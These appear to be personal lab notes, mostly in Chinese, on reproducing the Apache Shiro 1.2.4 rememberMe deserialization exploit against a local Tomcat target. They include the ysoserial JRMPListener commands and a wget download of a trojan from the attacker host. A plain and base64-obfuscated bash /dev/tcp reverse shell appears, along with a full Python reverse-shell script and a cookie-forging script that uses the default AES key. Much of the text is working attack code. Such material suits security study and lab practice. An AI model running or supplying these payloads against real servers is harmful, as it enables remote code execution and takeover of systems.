
# target
centos 192.168.207.3 
## install tomcat
	https://www.ionos.com/community/server-cloud-infrastructure/apache/install-and-use-apache-tomcat-on-centos-7/

## build and deploy	
	https://cloud.tencent.com/developer/article/1041471
	https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4
	需要安装jdk1.6和maven支持1.6的版本，比如C:\Dev\apache-maven-3.0.4\，然后需要添加下面这个xml
	.m2/toolchains.xml
	<?xml version="1.0" encoding="UTF8"?>
	<toolchains>
	  <toolchain>
		<type>jdk</type>
		<provides>
		  <version>1.6</version>
		  <vendor>sun</vendor>
		</provides>
		<configuration>
		   <jdkHome>C:\Program Files\Java\jdk1.6.0_45</jdkHome>
		</configuration>
	  </toolchain>
	</toolchains>
	shiro-shiro-root-1.2.4\samples\web

	mvn eclipse:eclipse
	mvn clean install
	
	http://192.168.207.3:8080/
	deploy war
	got error 
	The absolute uri: http://java.sun.com/jsp/jstl/core cannot be resolved in either web.xml or the jar 
	change pom.xml
		这个是为了tomcat7下面能正常访问
		<dependency>
			<groupId>javax.servlet</groupId>
			<artifactId>jstl</artifactId>
			<version>1.2</version>
			<scope>runtime</scope>
		</dependency>
		这个是为了跟ysoserial的依赖保持版本一致，去掉之后应该收不到tcp连接
		<dependency>
			<groupId>commons-beanutils</groupId>
			<artifactId>commons-beanutils</artifactId>
			<version>1.9.2</version>
			<exclusions>
				<exclusion>
					<groupId>commons-logging</groupId>
					<artifactId>commons-logging</artifactId>
				</exclusion>
			</exclusions>
		</dependency>
		下面这个千万别加，加了之后ysoserial的JRMPListener直接收不到tcp连接！！！
		<!--
		<dependency>
			<groupId>org.apache.commons</groupId>
			<artifactId>commons-collections4</artifactId>
			<version>4.0</version>
		</dependency>
		-->
		下面这个有人提，但是貌似没用
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>servlet-api</artifactId>
            <!--<scope>provided</scope>-->
        </dependency>
# exploit:
kali 192.168.207.4
## 开启监听，反弹shell监听
nc -lvp 10000

## 发送payload方法
利用burpsuite；
利用httpie； 
	http http://192.168.207.3:8080/samples-web-1.2.4/ Cookie:`cat /tmp/payload.cookie`
利用python脚本直接发送http请求携带cookie；

#method 1 利用CommonsCollections5
https://www.cnblogs.com/loong-hon/p/10619616.html
service apache2 start
cp getshell.py /var/www/html/

第一个payload下载木马：
python shiro.py 192.168.207.4:10001
开启监听，收到靶机连接时下载木马
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 10001 CommonsCollections5 'wget 192.168.207.4/getshell.py -O /tmp/shell.py'
发送payload
第二个payload，其实跟第一个一样都是一个JRMPClient端，只不过由于可能是shiro sample web的原因，估计同一个cookie值会被忽略，所以如果不行就再生成一个payload
同样是： python shiro.py 192.168.207.4:10001
然后开启监听，这次直接运行shell脚本
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 10001 CommonsCollections5 'python /tmp/shell.py'

#method 2 自定义ysoserial利用commons-collections-3.2.1
shiro1.2.4 默认的依赖是 WEB-INF.lib.commons-collections-3.2.1.jar
所以要自定义ysoserial的payload
https://meizjm3i.github.io/2019/07/07/Commons-Collections%E6%96%B0%E5%88%A9%E7%94%A8%E9%93%BE%E6%8C%96%E6%8E%98%E5%8F%8AWCTF%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF%E4%B8%B2%E8%AE%B2/

#method 3 利用CommonsCollections4 失败
## 构造payload
核心payload：反弹shell
bash -i >& /dev/tcp/192.168.207.4/10000 0>&1
http://www.jackson-t.ca/runtime-exec-payloads.html
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNy40LzEwMDAwIDA+JjE=}|{base64,-d}|{bash,-i}
开启ysoserial
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 10001 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNy40LzEwMDAwIDA+JjE=}|{base64,-d}|{bash,-i}'

python shiro.py 192.168.207.4:10001

# scripts

## getshell.py:
	import socket,subprocess,os;
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
	s.connect(("192.168.207.4",10000));
	os.dup2(s.fileno(),0);
	os.dup2(s.fileno(),1);
	os.dup2(s.fileno(),2);
	p=subprocess.call(["/bin/sh","-i"]);
## shiro.py:
# pip install pycrypto
	import sys
	import uuid
	import base64
	import subprocess
	from Crypto.Cipher import AES

	def encode_rememberme(command):
		popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
		BS = AES.block_size
		pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
		key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
		iv = uuid.uuid4().bytes
		encryptor = AES.new(key, AES.MODE_CBC, iv)
		file_body = pad(popen.stdout.read())
		base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
		return base64_ciphertext

	if __name__ == '__main__':
		payload = encode_rememberme(sys.argv[1])    
	print "rememberMe={0}".format(payload.decode())


失败怀疑：
1.靶子机器 jdk版本，tomcat版本
 1016  sudo yum install java-1.6.0-openjdk
 1017  sudo systemctl restart tomcat
 1018  alternatives --config java
 1019  sudo alternatives --config java
 1020  sudo systemctl restart tomcat
2.shiro web sample依赖跟 ysoserial的依赖版本不一致


https://paper.seebug.org/shiro-rememberme-1-2-4/
https://mp.weixin.qq.com/s/8F5tmbJsE0SshrYK-fRl-g
https://mp.weixin.qq.com/s/4nlIj2xz8HMkJpHKCl32aQ
yum install java-1.8.0-openjdk
update-alternatives --config java
JAVA_HOME 

https://blog.csdn.net/jiangbb8686/article/details/100158824
于是我修改版本号到1.9.2

https://xz.aliyun.com/t/2650
https://www.cnblogs.com/peterpan0707007/p/11342997.html
http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html

https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/

基于CommonsCollections4的Gadget分析
https://www.cnblogs.com/Welk1n/p/10511145.html

